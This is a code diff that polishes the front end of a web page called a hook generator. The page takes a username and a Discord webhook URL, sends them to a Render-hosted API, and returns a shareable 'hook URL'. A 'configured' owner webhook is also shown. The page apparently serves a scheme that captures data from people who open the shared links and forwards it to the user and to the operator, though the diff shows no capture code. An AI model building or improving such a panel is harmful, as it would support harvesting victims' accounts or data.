@@ -47,6 +47,7 @@
             transition:.2s;
         }
         .btn-primary:hover{transform:scale(1.02);box-shadow:0 8px 30px rgba(82,113,255,.3);}
+        .btn-primary:disabled{opacity:.5;cursor:not-allowed;transform:none;}
         .result-box{
             margin-top:20px;
             padding:16px;
@@ -82,6 +83,8 @@
         .status{display:inline-block;padding:4px 12px;border-radius:999px;font-size:10px;font-weight:600;text-transform:uppercase;}
         .status.online{background:rgba(69,220,147,.15);color:#45dc93;border:1px solid rgba(69,220,147,.2);}
         .status.offline{background:rgba(255,107,107,.15);color:#ff6b6b;border:1px solid rgba(255,107,107,.2);}
+        .status.checking{background:rgba(255,215,0,.15);color:#ffd700;border:1px solid rgba(255,215,0,.2);animation:pulse 1s infinite;}
+        @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
         .divider{margin:20px 0;border:0;border-top:1px solid rgba(255,255,255,.06);}
         .faq-item{background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:12px 16px;margin-bottom:8px;cursor:pointer;transition:.2s;}
         .faq-item:hover{background:rgba(255,255,255,.07);}
@@ -91,6 +94,10 @@
         .faq-item.open .a{display:block;}
         .faq-item.open .chev{transform:rotate(180deg);}
         .footer{margin-top:20px;font-size:11px;color:#555;text-align:center;}
+        .error-msg{color:#ff6b6b;font-size:12px;margin-top:8px;display:none;padding:8px;background:rgba(255,107,107,.1);border-radius:8px;border:1px solid rgba(255,107,107,.1);}
+        .error-msg.show{display:block;}
+        .loading-spinner{display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.1);border-top-color:#5271ff;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px;}
+        @keyframes spin{to{transform:rotate(360deg)}}
     </style>
 </head>
 <body>
@@ -101,8 +108,10 @@
         <div class="input-group">
             <input type="text" id="username" placeholder="Enter your username" autocomplete="off">
             <input type="text" id="webhookUrl" placeholder="Your Discord Webhook URL" autocomplete="off">
-            <button class="btn-primary" onclick="generateHook()">🔗 Generate My Hook URL</button>
+            <button class="btn-primary" id="generateBtn" onclick="generateHook()">🔗 Generate My Hook URL</button>
         </div>
+
+        <div class="error-msg" id="errorMsg"></div>
 
         <div class="result-box" id="resultBox">
             <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;">
@@ -125,10 +134,13 @@
         <div style="margin-bottom:16px;">
             <div style="display:flex;justify-content:space-between;align-items:center;">
                 <span style="font-size:13px;color:#969aa5;">📡 Server Status</span>
-                <span class="status online" id="serverStatus">Online</span>
+                <span class="status checking" id="serverStatus">Checking...</span>
             </div>
             <div style="font-size:12px;color:#555;margin-top:4px;">
                 Owner Hook: <span id="ownerStatus" style="color:#45dc93;">✅ Configured</span>
+            </div>
+            <div style="font-size:11px;color:#555;margin-top:4px;" id="serverUrlDisplay">
+                API: <span style="color:#5271ff;">https://vrtxduel.onrender.com</span>
             </div>
         </div>
 
@@ -164,39 +176,96 @@
     </div>
 
     <script>
-        const API_BASE = 'https://vrtxduel.onrender.com'; // Your Render URL
+        const API_BASE = 'https://vrtxduel.onrender.com';
 
+        // ============================================================
+        //  CHECK SERVER STATUS (with better error handling)
+        // ============================================================
+        async function checkServerStatus() {
+            const statusEl = document.getElementById('serverStatus');
+            const ownerEl = document.getElementById('ownerStatus');
+            
+            statusEl.textContent = 'Checking...';
+            statusEl.className = 'status checking';
+            
+            try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 10000);
+                
+                const response = await fetch(`${API_BASE}/`, {
+                    signal: controller.signal
+                });
+                clearTimeout(timeoutId);
+                
+                if (response.ok) {
+                    const data = await response.json();
+                    statusEl.textContent = 'Online';
+                    statusEl.className = 'status online';
+                    ownerEl.textContent = data.ownerWebhookConfigured ? '✅ Configured' : '❌ Not configured';
+                    ownerEl.style.color = data.ownerWebhookConfigured ? '#45dc93' : '#ff6b6b';
+                } else {
+                    statusEl.textContent = 'Error';
+                    statusEl.className = 'status offline';
+                }
+            } catch (error) {
+                statusEl.textContent = 'Offline';
+                statusEl.className = 'status offline';
+                console.warn('Server status check failed:', error.message);
+            }
+        }
+
+        // ============================================================
+        //  GENERATE HOOK
+        // ============================================================
         async function generateHook() {
             const username = document.getElementById('username').value.trim();
             const webhookUrl = document.getElementById('webhookUrl').value.trim();
+            const btn = document.getElementById('generateBtn');
+            const errorEl = document.getElementById('errorMsg');
+            
+            errorEl.classList.remove('show');
+            errorEl.textContent = '';
 
             if (!username) {
-                alert('Please enter your username');
+                errorEl.textContent = '⚠️ Please enter your username';
+                errorEl.classList.add('show');
                 return;
             }
             if (!webhookUrl) {
-                alert('Please enter your Discord webhook URL');
+                errorEl.textContent = '⚠️ Please enter your Discord webhook URL';
+                errorEl.classList.add('show');
                 return;
             }
             if (!webhookUrl.startsWith('https://discord.com/api/webhooks/')) {
-                alert('Please enter a valid Discord webhook URL');
+                errorEl.textContent = '⚠️ Please enter a valid Discord webhook URL';
+                errorEl.classList.add('show');
                 return;
             }
+
+            // Disable button and show loading state
+            btn.disabled = true;
+            btn.innerHTML = '<span class="loading-spinner"></span> Generating...';
 
             const resultBox = document.getElementById('resultBox');
             resultBox.classList.remove('show');
 
             try {
+                const controller = new AbortController();
+                const timeoutId = setTimeout(() => controller.abort(), 30000);
+                
                 const response = await fetch(`${API_BASE}/api/generate`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ username, webhookUrl })
+                    body: JSON.stringify({ username, webhookUrl }),
+                    signal: controller.signal
                 });
+                clearTimeout(timeoutId);
 
                 const data = await response.json();
 
-                if (!data.success) {
-                    alert('Error: ' + (data.error || 'Unknown error'));
+                if (!response.ok || !data.success) {
+                    errorEl.textContent = '❌ ' + (data.error || 'Unknown error occurred');
+                    errorEl.classList.add('show');
                     return;
                 }
 
@@ -213,17 +282,30 @@
                 localStorage.setItem('vrtHookId', data.hookId);
                 localStorage.setItem('vrtUsername', username);
 
+                errorEl.textContent = '✅ Hook generated successfully!';
+                errorEl.style.color = '#45dc93';
+                errorEl.classList.add('show');
+
             } catch (error) {
-                alert('Error: ' + error.message);
+                if (error.name === 'AbortError') {
+                    errorEl.textContent = '⏱️ Request timed out. Please try again.';
+                } else {
+                    errorEl.textContent = '❌ Error: ' + error.message;
+                }
+                errorEl.classList.add('show');
+            } finally {
+                btn.disabled = false;
+                btn.innerHTML = '🔗 Generate My Hook URL';
             }
         }
 
         function copyHookUrl() {
             const url = document.getElementById('hookUrlDisplay').textContent;
+            if (!url || url === 'Loading...') return;
+            
             navigator.clipboard.writeText(url).then(() => {
                 alert('✅ Hook URL copied to clipboard!');
             }).catch(() => {
-                // Fallback
                 const textarea = document.createElement('textarea');
                 textarea.value = url;
                 document.body.appendChild(textarea);
@@ -236,24 +318,13 @@
 
         function openHookPage() {
             const url = document.getElementById('hookUrlDisplay').textContent;
+            if (!url || url === 'Loading...') return;
             window.open(url, '_blank');
         }
 
-        // Check server status
-        async function checkServerStatus() {
-            try {
-                const response = await fetch(`${API_BASE}/`);
-                const data = await response.json();
-                document.getElementById('serverStatus').textContent = 'Online';
-                document.getElementById('serverStatus').className = 'status online';
-                document.getElementById('ownerStatus').textContent = data.ownerWebhookConfigured ? '✅ Configured' : '❌ Not configured';
-                document.getElementById('ownerStatus').style.color = data.ownerWebhookConfigured ? '#45dc93' : '#ff6b6b';
-            } catch (error) {
-                document.getElementById('serverStatus').textContent = 'Offline';
-                document.getElementById('serverStatus').className = 'status offline';
-            }
-        }
+        // Initial status check
         checkServerStatus();
+        // Check every 30 seconds
         setInterval(checkServerStatus, 30000);
     </script>
 </body>
